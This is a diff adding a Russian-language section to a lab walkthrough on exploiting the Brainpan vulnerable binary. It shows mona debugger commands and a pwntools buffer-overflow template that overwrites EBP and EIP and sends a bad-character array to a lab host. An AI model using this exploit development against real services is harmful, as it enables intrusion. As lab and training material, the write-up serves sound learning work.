@@ -214,7 +214,67 @@ io.interactive()
 Получаю контроль над адресом возврата  
 <img width="1920" height="1022" alt="image" src="https://github.com/user-attachments/assets/90061dc7-7b56-4a39-993c-306a052ba824" />
 
-Далее ищу **badchars**
+### Далее ищу **badchars**
+
+Небольшая настройка immunity debugger
+`!mona config -set workingfolder c:\mona\%p`
+
+Массив байтов можно сгенерировать в **mona** и исключить из него нулевой **"\x00"**
+`!mona bytearray -b "\x00"`
+
+А можно написать код **python**
+```python
+exclude_list = ["\\x00"]
+
+for x in range(1, 256):
+    hex_str = "\\x" + "{:02x}".format(x)
+    if hex_str not in exclude_list:
+        print(hex_str, end='')
+print()
+```
+
+Я буду использовать такой код и генерировать массив байтов прямо в шаблоне:
+```python
+from pwn import *
+
+context.update(arch='i386')
+exe = './brainpan.exe'
+
+host = args.HOST or '192.168.56.124'
+port = int(args.PORT or 9999)
+
+#====================PAYLOAD DEFINITION=====================
+junk    = b'A'*520
+EBP     = b'B'*4
+EIP     = b'C'*4
+
+exclude_list = ["\\x00"]
+stack   = ''.join(f"\\x{x:02x}" for x in range(1, 256) if f"\\x{x:02x}" not in exclude_list)
+log.info(b'-------------------------------------------')
+log.success(f'badchars: {stack}')
+log.info(b'-------------------------------------------')
+
+payload = b''.join([
+    junk,
+    EBP,
+    EIP,
+    stack.encode('latin-1'),
+])
+#========================CONNECTION=========================
+io = start()
+
+print(io.recv().decode('utf-8'))
+io.sendline(payload)
+
+io.interactive()
+```
+
+Мой код попадает в стек по адресу `ESP 0022F930`  
+<img width="439" height="303" alt="image" src="https://github.com/user-attachments/assets/96b29612-0dca-4339-8c96-fa6dac88d0f4" />
+
+
+Сравниваю в **mona** `!mona compare -f "c:\mona\brainpan\bytearray.bin" -a 0022F930`  
+<img width="449" height="371" alt="image" src="https://github.com/user-attachments/assets/0b4a9e05-fc50-42d4-b5c3-a188fed80f64" />
 
 
 ## 📂 Получение доступа
